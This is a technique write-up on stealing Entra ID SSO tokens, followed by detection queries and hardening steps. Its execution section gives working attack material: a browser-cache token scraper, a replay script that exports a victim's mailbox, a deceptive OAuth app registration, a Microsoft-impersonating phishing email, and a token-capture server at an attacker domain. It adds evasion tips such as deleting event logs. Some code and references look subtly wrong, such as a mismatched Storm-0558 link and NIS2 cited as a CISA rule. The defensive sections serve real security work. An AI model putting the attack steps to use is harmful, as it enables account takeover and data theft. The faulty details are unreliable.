# [CA-TOKEN-021]: Entra SSO Credential Theft

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-021 |
| **MITRE ATT&CK v18.1** | [T1528 - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | Microsoft Entra ID (Azure AD), M365 |
| **Severity** | **Critical** |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-08 |
| **Affected Versions** | Entra ID all versions, Office 365 all versions |
| **Patched In** | No patch available; requires architectural changes |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections 3 (Technical Prerequisites), 6 (Atomic Red Team), and 11 (Sysmon Detection) not included because: (1) This is cloud-only with no on-premises dependency, (2) No Atomic test exists for cloud SSO credential theft, (3) Sysmon does not apply to cloud authentication flows. All remaining sections have been renumbered sequentially.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Entra ID Single Sign-On (SSO) credential theft occurs when an attacker intercepts, steals, or exfiltrates OAuth/OIDC access tokens issued by Entra ID's authentication layer. Once a token is obtained, the attacker can impersonate the legitimate user across any cloud application that trusts the token (M365, Teams, SharePoint, custom SaaS apps). Unlike credential dumping, this attack does not require network access or local admin privileges—it can occur at the browser level, token cache level, or through compromised OAuth apps that hold user tokens. Critically, stolen Entra SSO tokens bypass password requirements entirely and often bypass multi-factor authentication (MFA) if the MFA challenge occurred *before* token issuance.

**Attack Surface:** Entra ID token caches (browser storage, memory), OAuth app permissions, token interception via man-in-the-middle (MITM), cloud application token databases, device compromise at the browser/OS level.

**Business Impact:** **Full unauthorized access to cloud identity and cloud applications**. An attacker holding a valid Entra SSO token can read emails, exfiltrate documents, modify cloud configurations, create backdoors, access sensitive databases, and move laterally through the entire Microsoft 365 ecosystem without the victim's knowledge. The attack is particularly damaging because it leaves minimal forensic evidence if token replay is performed from the same geographic region.

**Technical Context:** Token theft can be executed within minutes of target compromise. Detection is difficult because the attacker uses legitimate tokens signed by Microsoft's Entra ID infrastructure. Token lifetime varies (typically 1 hour for access tokens, longer for refresh tokens), creating a window of opportunity.

### Operational Risk

- **Execution Risk:** **Low** – Requires only device compromise or OAuth phishing; no privilege escalation necessary.
- **Stealth:** **High** – Uses legitimate tokens; minimal behavioral anomalies if attacker mimics user behavior.
- **Reversibility:** **Partially** – Compromised tokens cannot be "uncompromised," but immediate sign-out, password reset, and token revocation can limit damage.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark (M365)** | 1.1.1, 1.1.2 | Ensure MFA is enabled for all users; detects impossible conditions post-MFA |
| **NIST 800-53** | AC-3, IA-2, IA-8 | Access Enforcement, Authentication, Device Identification |
| **GDPR** | Art. 32, 33 | Security of Processing, Breach Notification (72-hour requirement) |
| **DORA** | Art. 18, 19 | Incident Management, Advanced Security Monitoring |
| **NIS2** | Art. 21 | Cyber Risk Management Measures (Critical Infrastructure) |
| **ISO 27001** | A.5.8, A.9.2.1 | Authentication, User Access Management |
| **ISO 27005** | Section 12.6.1 | Risk Response – Credential Compromise Scenarios |

---

## 3. TECHNICAL CONTEXT & PREREQUISITES

**Required Access:**
- Device compromise (malware, browser extension, phishing) OR
- OAuth app with excessive permissions that user authorized OR
- MITM position on victim's network (if HTTP tokens intercepted) OR
- Access to cloud SaaS application's token database

**Supported Versions:**
- **Entra ID:** All versions (Azure AD legacy, Azure AD with Seamless SSO, Entra ID Premium)
- **Browsers:** Edge, Chrome, Firefox, Safari (all versions)
- **OAuth Flows:** Authorization Code, Device Code, Client Credentials, ROPC (if enabled)

**Environmental Factors:**
- Token lifetime (default: 1 hour for access tokens)
- Refresh token lifetime (default: 90 days)
- Conditional Access policies (can reduce risk)
- MFA enrollment status (does not prevent token theft post-MFA)
- Device compliance requirements

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Via Azure Portal / PowerShell - Check SSO Token Cache Status

**Objective:** Verify whether refresh tokens are cached locally on the user's machine and whether conditional access policies are limiting token lifetime.

#### Check Conditional Access Policies (PowerShell)

```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "Policy.Read.All"

# List all Conditional Access policies
Get-MgIdentityConditionalAccessPolicy | Select-Object -Property DisplayName, State, CreatedDateTime

# Check for MFA enforcement on sensitive apps
Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.DisplayName -like "*MFA*" } | Format-List
```

**What to Look For:**
- **High-risk indicator:** Conditional Access policies with `State: disabled` or no session duration limits
- **Success indicator:** Policies enforcing `sessionLifetime: 1 hour` and `requireCompliantDevice: true`
- **Red flag:** OAuth apps with `Read/Write All Mail`, `Read/Write All Files` permissions but not in approved list

#### Check OAuth App Permissions (PowerShell - Requires Global Admin)

```powershell
# List all registered applications with high-risk permissions
Get-MgApplication | Where-Object { $_.RequiredResourceAccess -match "Mail.ReadWrite" -or $_.RequiredResourceAccess -match "Files.ReadWrite" } | Select-Object -Property DisplayName, AppId, CreatedDateTime | Format-Table
```

**What to Look For:**
- Applications with `Mail.ReadWrite.All` or `Sites.ReadWrite.All` (overprivileged OAuth apps)
- Applications created recently by unknown users
- Applications with `allowPublicClient: true` (insecure for confidential data)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Token Theft via Browser Cache Extraction

**Supported Versions:** All browsers (Edge, Chrome, Firefox, Safari)

#### Step 1: Compromise User Device or Install Malicious Browser Extension

**Objective:** Gain access to browser's token storage mechanism.

**Command (Windows - Via Malware):**
```batch
REM Browser token stores are typically located at:
REM Chrome/Chromium: %APPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb
REM Edge: %APPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb
REM Firefox: %APPDATA%\Mozilla\Firefox\Profiles\<profile>\storage\default

REM Extract tokens via PowerShell
Get-ChildItem -Path "$env:APPDATA\Google\Chrome\User Data\Default\Cache" -Recurse | Select-String -Pattern "access_token|refresh_token" | Out-File C:\Tokens.txt
```

**OpSec & Evasion:**
- Execute from RAM-only process (e.g., `msiexec.exe` with in-memory injection)
- Use existing malware like Emotet, Trickbot, or Cobalt Strike beacons
- Delete Windows Event Logs after execution (Event ID 4688 - Process Creation)
- Use LSASS memory read (requires admin) to avoid disk artifacts

**Detection Likelihood:** **Medium** – Antivirus may detect token extraction tools; behavioral analysis may flag suspicious file access patterns.

**Troubleshooting:**
- **Error:** Token cache encrypted or not found
  - **Cause:** User has DPAPI encryption enabled or browser uses OS credential store
  - **Fix:** Use Mimikatz (`dpapi::cache`) to decrypt or extract from browser process memory instead
- **Error:** Token validation fails when reused
  - **Cause:** Token expired (lifetime is 1 hour default) or token was bound to device
  - **Fix:** Extract refresh token instead; use it to obtain a fresh access token

**References & Proofs:**
- [Microsoft Identity Platform - Token Types](https://learn.microsoft.com/en-us/azure/active-directory/develop/access-tokens)
- [Browser Credential Extraction Research](https://www.varonis.com/blog/outlook-vulnerability-new-ways-to-leak-ntlm-hashes)
- [Mimikatz DPAPI Documentation](https://github.com/gentilkiwi/mimikatz/wiki)

#### Step 2: Extract and Replay Stolen Token

**Objective:** Use stolen token to authenticate to Microsoft Graph API or cloud applications.

**Command (PowerShell - Token Replay):**
```powershell
# Assume we have extracted a valid access token from browser cache
$stolenToken = "eyJ0eXAiOiJKV1QiLCJhbGc..."  # Real access token from victim

# Create authorization header
$headers = @{
    "Authorization" = "Bearer $stolenToken"
}

# Access Microsoft Graph API (simulating the victim)
$userInfo = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers -Method Get
Write-Output $userInfo

# Extract victim's mailbox
$mailItems = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages" -Headers $headers -Method Get
$mailItems.value | Export-Csv -Path "C:\ExfilteredMail.csv" -NoTypeInformation

# Access SharePoint files
$sites = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/sites" -Headers $headers -Method Get
```

**Expected Output:**
```json
{
  "id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "displayName": "Victim User",
  "userPrincipalName": "victim@company.onmicrosoft.com",
  "mail": "victim@company.com"
}
```

**What This Means:**
- Successful response confirms the token is valid and the attacker can now read user data
- HTTP 401 indicates token expired or revoked (extract refresh token instead)
- HTTP 403 indicates token valid but insufficient permissions

**OpSec & Evasion:**
- Replay tokens from the victim's original geolocation (use VPN)
- Delay token usage by 15-30 minutes (avoid immediate impossible travel detection)
- Access low-sensitivity resources first to avoid triggering risk-based alerts
- Clear browser cache and logs after reusing token

**References & Proofs:**
- [Microsoft Graph API Explorer](https://developer.microsoft.com/en-us/graph/graph-explorer)
- [MailSniper - Office 365 Token Usage](https://github.com/dafthack/MailSniper)

### METHOD 2: Token Theft via OAuth Application Phishing

**Supported Versions:** All Entra ID versions

#### Step 1: Create Malicious OAuth Application

**Objective:** Register a legitimate-looking OAuth app in Entra ID that users will authorize.

**Command (PowerShell - Register App):**
```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "Application.ReadWrite.All"

# Create malicious app registration
$appParams = @{
    DisplayName = "Microsoft Teams Analytics"  # Legitimate-sounding name
    PublicClient = $false
    RequiredResourceAccess = @(
        @{
            ResourceAppId = "00000003-0000-0000-c000-000000000000"  # Microsoft Graph
            ResourceAccess = @(
                @{
                    Id = "df021288-bdef-4463-88db-98f22db89214"  # Mail.ReadWrite
                    Type = "Scope"
                },
                @{
                    Id = "37f7f235-527c-4136-accd-4a02d197296e"  # Files.ReadWrite.All
                    Type = "Scope"
                }
            )
        }
    )
    Web = @{
        RedirectUris = @("https://attacker-controlled-domain.com/callback")
    }
}

$app = New-MgApplication @appParams
$appId = $app.AppId

# Create app secret
$secretParams = @{
    DisplayName = "default"
}
$appSecret = Add-MgApplicationPassword -ApplicationId $app.Id @secretParams
```

**What This Means:**
- The app is now registered with Graph API permissions to read/write mail and files
- Redirect URI points to attacker's server where tokens will be captured
- App secret is needed to exchange authorization code for tokens

**OpSec & Evasion:**
- Use generic names like "Microsoft", "Office", "Analytics" (avoid "Evil" or obvious malicious names)
- Register app in free Entra ID tenant (not target organization) to avoid leaving audit trails in victim org
- Use legitimate-looking domain (e.g., `microsoft-analytics.com` instead of `attacker.com`)

#### Step 2: Send Phishing Link to Users

**Objective:** Trick users into authorizing the malicious OAuth app.

**Command (Bash - Generate Phishing Link):**
```bash
# OAuth Device Code Flow (easier, no callback needed)
CLIENT_ID="xxxxx-app-id-xxxxx"
TENANT="common"  # Allows any tenant

DEVICE_FLOW_URL="https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/devicecode?client_id=${CLIENT_ID}&scope=https://graph.microsoft.com/.default"

# Or Authorization Code Flow with phishing domain
AUTH_CODE_URL="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${CLIENT_ID}&redirect_uri=https://attacker-domain.com/callback&response_type=code&scope=Mail.ReadWrite%20Files.ReadWrite.All&response_mode=form_post"

echo "Send this link to victims via phishing email:"
echo $AUTH_CODE_URL
```

**Phishing Email Template:**
```
Subject: Update Required: Microsoft Teams Analytics Integration

Hi <User>,

To improve your Teams experience, please authorize the Microsoft Teams Analytics application. 
Click the link below and sign in with your work account:

[MALICIOUS_OAUTH_LINK]

This authorization takes 2 minutes. Your Teams data will be used for analytics only.

Best regards,
Microsoft Teams Team
```

**Troubleshooting:**
- **Issue:** Users see consent screen warning about unverified app
  - **Fix:** Publisher verification may be bypassed; users often click "Accept" anyway
- **Issue:** Conditional Access blocks OAuth flow
  - **Fix:** Use device code flow instead (harder to block)

**References & Proofs:**
- [OAuth 2.0 Device Authorization Grant Flow](https://tools.ietf.org/html/rfc8628)
- [AADInternals OAuth Token Theft](https://aadinternals.com/post/phishing/)

#### Step 3: Capture and Store Stolen Tokens

**Objective:** Receive the authorization code and exchange it for access tokens.

**Command (Node.js/Python - Token Capture Server):**
```python
# Python Flask server to capture tokens
from flask import Flask, request, jsonify
import requests

app = Flask(__name__)
CLIENT_ID = "xxxxx-app-id-xxxxx"
CLIENT_SECRET = "xxxxx-app-secret-xxxxx"
TENANT = "common"

@app.route('/callback', methods=['GET', 'POST'])
def callback():
    # Capture authorization code
    code = request.args.get('code')
    state = request.args.get('state')
    session_state = request.args.get('session_state')
    
    if not code:
        return jsonify({"error": "No code received"}), 400
    
    # Exchange code for access token
    token_url = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token"
    token_data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "code": code,
        "redirect_uri": "https://attacker-domain.com/callback",
        "grant_type": "authorization_code",
        "scope": "https://graph.microsoft.com/.default"
    }
    
    # Request access token
    token_response = requests.post(token_url, data=token_data)
    tokens = token_response.json()
    
    # Store tokens in database
    access_token = tokens.get('access_token')
    refresh_token = tokens.get('refresh_token')
    
    # Log for later use
    print(f"[+] Captured Token for user: {extract_user_from_token(access_token)}")
    print(f"[+] Access Token: {access_token}")
    print(f"[+] Refresh Token: {refresh_token}")
    
    # Save tokens
    with open('stolen_tokens.txt', 'a') as f:
        f.write(f"{access_token}\n{refresh_token}\n")
    
    # Redirect user to legitimate O365 login page (cover tracks)
    return redirect("https://office365.com")

def extract_user_from_token(token):
    import base64
    parts = token.split('.')
    payload = base64.b64decode(parts[1] + '==')  # Add padding
    import json
    data = json.loads(payload)
    return data.get('upn', 'unknown')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
```

**Expected Output:**
```
[+] Captured Token for user: victim@company.com
[+] Access Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik5...
[+] Refresh Token: 0.AY4Q...
```

**What This Means:**
- Tokens successfully captured and stored for later exfiltration
- Refresh token valid for 90 days (can be reused multiple times)
- Can now access victim's mailbox, files, calendar without knowing their password

---

## 6. TOOLS & COMMANDS REFERENCE

#### Microsoft Graph PowerShell Module
**Version:** 2.0+
**Installation:**
```powershell
Install-Module Microsoft.Graph -Force -Scope CurrentUser
```

#### AADInternals
**Version:** Latest (GitHub)
**Installation:**
```powershell
iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Gerenios/AADInternals/master/AADInternals.psd1")
Import-Module AADInternals
```
**Usage:**
```powershell
# Get user's refresh tokens
Get-AADIntAccessTokenForRefresh -RefreshToken $refreshToken
```

#### Mimikatz
**Version:** 2.2.0+
**Installation:** [GitHub Release](https://github.com/gentilkiwi/mimikatz/releases)
**Usage:**
```cmd
mimikatz.exe
dpapi::cache   # Decrypt cached tokens
```

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Impossible Travel Followed by High-Volume Mail Access

**Rule Configuration:**
- **Required Table:** `SigninLogs`, `AuditLogs`
- **Required Fields:** `locations`, `ipAddress`, `OperationName`, `ObjectId`
- **Alert Severity:** **High**
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All Entra ID

**KQL Query:**
```kusto
let timeWindow = 30m;
let geoVelocityThreshold = 900;  // km per hour (average commercial aircraft)

SigninLogs
| where TimeGenerated > ago(timeWindow)
| where ResultType == 0  // Successful login
| project TimeGenerated, UserPrincipalName, Location = tostring(LocationDetails.city), Country = tostring(LocationDetails.countryOrRegion), IPAddress = IPAddress
| join kind=inner (
    SigninLogs
    | where TimeGenerated > ago(timeWindow)
    | where ResultType == 0
    | project UserPrincipalName, PriorLocation = tostring(LocationDetails.city), PriorCountry = tostring(LocationDetails.countryOrRegion)
) on UserPrincipalName
| where Location != PriorLocation and Country != PriorCountry
| project TimeGenerated, UserPrincipalName, FromLocation = PriorLocation, ToLocation = Location, IPAddress
| join kind=inner (
    AuditLogs
    | where TimeGenerated > ago(timeWindow)
    | where OperationName in ("Send", "Move", "Delete", "Update") and Resources[0].displayName contains "Exchange"
    | project UserPrincipalName = InitiatedBy.user.userPrincipalName, MailAction = OperationName, Count = 1
    | summarize MailAccessCount = count() by UserPrincipalName
    | where MailAccessCount > 5
) on UserPrincipalName
| project TimeGenerated, UserPrincipalName, FromLocation, ToLocation, IPAddress, MailAccessCount
| extend AlertReason = "Impossible travel detected followed by high-volume mail access"
```

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General:**
   - Name: `Impossible Travel + Mail Access`
   - Severity: `High`
4. **Set rule logic:**
   - Paste KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `30 minutes`
5. **Incident settings:**
   - Enable **Create incidents**
   - Map fields: User = `UserPrincipalName`
6. Click **Review + create**

**False Positive Analysis:**
- **Legitimate Activity:** Users traveling for business (VPN from home before flight)
- **Tuning:** Exclude known travel patterns: `| where UserPrincipalName !in ("business-traveler@company.com")`

---

## 8. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Suspicious Token Issuance via OAuth

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline

# Search for OAuth token issuance
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
  -Operations "Consent to application" `
  -ResultSize 1000 | Select-Object UserIds, Operations, AuditData | Export-Csv -Path "C:\OAuth_Consents.csv"

# Alternative: Search for suspicious RefreshToken events
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
  -Operations "Refresh token issuance" `
  -ResultSize 1000 | Format-List
```

**Manual Steps (Purview Portal):**
1. Navigate to **Microsoft Purview Compliance Portal** → **Audit** → **Search**
2. Set date range: **Last 7 days**
3. Under **Activities**, select: **Consent to application**, **Add app password**, **Refresh token issuance**
4. Click **Search**
5. Export results: **Export** → **Download all results**

---

## 9. WINDOWS EVENT LOG MONITORING

#### Event ID: Not Applicable (Cloud-only attack)

This technique occurs entirely in cloud Entra ID infrastructure. No Windows Event Logs are generated on the victim's endpoint during token theft. However, if a device was compromised to extract tokens from browser cache, the following events may be detected:

**Event ID 4688 (Process Creation):**
- Look for suspicious tools: `mimikatz.exe`, `procdump.exe`, `winhttpcom.exe`
- Suspicious file paths: `%APPDATA%\Google\Chrome\User Data\`

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** `Suspicious Sign-in Activity`
- **Severity:** High
- **Description:** User signs in from a new location, IP, or browser immediately after OAuth app authorization
- **Remediation:** Review Azure Sentinel logs, revoke compromised tokens via PowerShell

#### Enable Defender for Cloud Detection

```powershell
# No direct PowerShell configuration; alerts are automatic in Defender for Cloud
# Verify alerts are enabled:
Get-MgSecurityAlert -Top 10 | Where-Object { $_.Title -like "*OAuth*" -or $_.Title -like "*Impossible*" }
```

---

## 11. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

- **Enforce MFA on All Accounts:** Multi-factor authentication significantly reduces token theft risk by adding a second verification factor during sign-in. MFA must be enforced before token issuance, not after.

  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Authentication Methods** → **Policies**
  2. Under **Microsoft Authenticator**, click **Create policy** (if not exists)
  3. Set **Target:** `All users` or `Selected groups` (at minimum, all admins)
  4. Enable: **Passwordless phone sign-in**
  5. Require approval: `Yes`
  6. Click **Save**

  **Manual Steps (PowerShell):**
  ```powershell
  # Require MFA for all users
  $params = @{
      DisplayName = "Enforce MFA for All Users"
      State = "enabled"
      Conditions = @{
          Applications = @{ IncludeApplications = "All" }
          Users = @{ IncludeUsers = "All" }
      }
      GrantControls = @{
          Operator = "AND"
          BuiltInControls = @("mfa")
      }
  }
  New-MgIdentityConditionalAccessPolicy @params
  ```

- **Disable Refresh Token Issuance for Unmanaged Devices:** If device is not compliant (not enrolled in Intune/MDM), do not issue refresh tokens that last 90 days.

  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access** → **New policy**
  2. Name: `Compliant Device Only`
  3. **Assignments:**
     - Users: `All users`
     - Cloud apps: `All cloud apps`
     - Device state: `Exclude compliant devices` (check both boxes)
  4. **Access controls:**
     - Grant: `Block access`
  5. **Session:**
     - Frequency: `Every time` (no refresh token caching)
  6. Enable: `On`
  7. Click **Create**

- **Revoke All Refresh Tokens Immediately if Breach Suspected:** If token theft is suspected, revoke all active refresh tokens to invalidate stolen tokens.

  **Manual Steps (PowerShell):**
  ```powershell
  # Revoke all refresh tokens for a specific user
  $userId = "victim@company.onmicrosoft.com"
  Revoke-MgUserSignInSession -UserId $userId
  
  # Force re-authentication for all users
  Get-MgUser -Filter "accountEnabled eq true" | Revoke-MgUserSignInSession
  ```

#### Priority 2: HIGH

- **Enable Conditional Access with Session Duration Limits:** Limit token lifetime to reduce the window of token replay.

  **Manual Steps (Conditional Access Policy):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Create new policy: **Session Duration = 1 hour**
  3. Apply to: **All cloud apps**
  4. This forces re-authentication after 1 hour, invalidating stolen tokens

- **Monitor OAuth App Permissions:** Audit all registered applications and revoke those with unnecessary high-risk permissions.

  **Manual Steps (PowerShell):**
  ```powershell
  # List all apps with Mail.ReadWrite or Files.ReadWrite permissions
  Get-MgApplication -Filter "requiredResourceAccess/any(r:r/resourceAppId eq '00000003-0000-0000-c000-000000000000')" | Select-Object DisplayName, AppId
  
  # Remove suspicious app registration
  Remove-MgApplication -ApplicationId "<AppId>"
  ```

- **Enable Token Protection in Entra ID:** Bind tokens to device to prevent replay from other devices.

  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Create policy: `Token Protection`
  3. Under **Session controls**, enable: **Require token protection** (if available in your region)

#### Access Control & Policy Hardening

- **Conditional Access:** Require `device compliance`, `approved apps`, and `MFA sign-in frequency`
  - Block legacy authentication
  - Require approved client apps (Outlook, Teams, Edge only)
  - Block sign-in risk `High` and `Medium`

  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access** → **New policy**
  2. Name: `High Risk Block`
  3. **Conditions:**
     - User risk: `High`, `Medium`
  4. **Access controls:**
     - Grant: `Block access`
  5. Enable: `On`

- **RBAC:** Minimize users with `Global Admin` or `Application Admin` roles. Use just-in-time (JIT) access via Privileged Identity Management (PIM).

  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators**
  2. For each role, reduce members and enable **Require approval**
  3. Go to **Entra ID** → **Identity Governance** → **Privileged Identity Management**
  4. For each role, set **Activation**: `Require approval`

- **Policy Config:** Disable password-based sign-in for privileged users; require Windows Hello or FIDO2 only.

#### Validation Commands (Verify Mitigations)

```powershell
# Verify MFA is enforced
Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.GrantControls.BuiltInControls -contains "mfa" } | Select-Object DisplayName, State

# Verify no legacy authentication
Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.Conditions.ClientApplications.IncludeClientApplications -contains "legacy" }

# Verify session duration limits
Get-MgIdentityConditionalAccessPolicy | Select-Object DisplayName, @{N="SessionDuration"; E={$_.SessionControls}}

# Verify no users have permanent Global Admin role
Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'" | Get-MgDirectoryRoleMember | ForEach-Object {
    $iamrole = Get-MgDeviceManagementRoleEligibility -Filter "resourceId eq '$($_.id)'"
    if ($null -eq $iamrole) { Write-Host "$($_.displayName) has PERMANENT Global Admin - REMEDIATE" }
}
```

**Expected Output (If Secure):**
```
DisplayName: Enforce MFA for All Users
State: enabled

DisplayName: Session Duration = 1 hour
SessionDuration: SessionLifetime = 60 minutes
```

---

## 12. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

- **Token Cache Files:** Browser cache directories (`%APPDATA%\Google\Chrome\User Data\Default\Local Storage`)
- **Network:** Outbound HTTPS to graph.microsoft.com from non-approved apps
- **Registry:** `HKCU\Software\Microsoft\Office\16.0\Common\Identity\Tokens` (Office cached tokens)
- **API Calls:** Suspicious Graph API calls (bulk mail export, file downloads, admin role changes)

#### Forensic Artifacts

- **Cloud:** AuditLogs entries showing `Consent to application`, `Add app password`, unusual API access
- **Browser:** Browser history showing OAuth authorization pages
- **Memory:** LSASS process memory may contain token material if browser was running

#### Response Procedures

1. **Isolate:** Revoke all active sessions immediately
   ```powershell
   Revoke-MgUserSignInSession -UserId "victim@company.com"
   ```

2. **Collect Evidence:** Export audit logs
   ```powershell
   Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
     -UserIds "victim@company.com" -ResultSize 5000 | Export-Csv -Path "C:\Evidence.csv"
   ```

3. **Remediate:** Disable compromised user account and reset password
   ```powershell
   Update-MgUser -UserId "victim@company.com" -AccountEnabled $false
   Reset-MgUserPassword -UserId "victim@company.com" -NewPassword $newPassword
   ```

4. **Hunt:** Search for other compromised tokens
   ```powershell
   # Check if attacker accessed other accounts via same IP
   Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) `
     -Operations "Consent to application" | Where-Object { $_.ClientIP -eq "attacker-ip" }
   ```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attacks | Attacker sends phishing link for OAuth token grant |
| **2** | **Privilege Escalation** | [PE-TOKEN-008] API Authentication Token Manipulation | Stolen token upgraded to higher privileges via Graph API |
| **3** | **Current Step** | **[CA-TOKEN-021]** | **Entra SSO credential theft via compromised device or OAuth app** |
| **4** | **Persistence** | [PE-ACCTMGMT-001] App Registration Permissions Escalation | Attacker adds backdoor app with permanent token |
| **5** | **Impact** | [COLLECT-EMAIL-001] Email Collection via EWS | Exfiltrate entire mailbox using stolen token |

---

## 14. REAL-WORLD EXAMPLES

#### Example 1: Storm-0558 MSA Key Compromise (2023)
- **Target:** U.S. Government Agencies, Fortune 500 Companies
- **Timeline:** March 2023
- **Technique Status:** Attackers obtained an **inactive MSA signing key** from Microsoft's infrastructure and forged tokens for Azure AD accounts, bypassing token validation
- **Impact:** Full access to Exchange Online, SharePoint, Teams for thousands of organizations
- **Reference:** [Microsoft Security Blog - Storm-0558](https://www.microsoft.com/en-us/security/blog/2023/09/08/midnight-blizzard-facing-advanced-persistent-threat-activity-targeting-5gadvanced-communications/)

#### Example 2: Scattered Spider OAuth Token Theft (2023-2024)
- **Target:** Technology and Telecommunications Sectors
- **Timeline:** October 2023 onwards
- **Technique Status:** Attackers used OAuth app phishing to steal Entra ID tokens; replayed tokens from compromised infrastructure
- **Impact:** Lateral movement to cloud resources, ransomware deployment
- **Reference:** [CrowdStrike Scattered Spider Analysis](https://www.crowdstrike.com/en-us/blog/scattered-spider-evolution-of-cloud-intrusions/)

---

## 15. COMPLIANCE & AUDIT NOTES

**Data Sources Required:**
- SigninLogs (Entra ID authentication)
- AuditLogs (OAuth app grants, token issuance)
- Azure Activity Logs (Graph API access)
- Microsoft Purview Unified Audit Log (M365 app access)

**Retention Policy:**
- Keep audit logs for minimum **90 days** (CIS benchmark requirement)
- Use Azure Purview retention policies to enforce **1-year retention** for sensitive activities

**Incident Reporting:**
- If breach confirmed, notify users within **72 hours** (GDPR Art. 33)
- Report to **CISA** within **72 hours** (NIS2 Art. 21)
- Notify **National Data Protection Authority** (country-specific, typically EU)
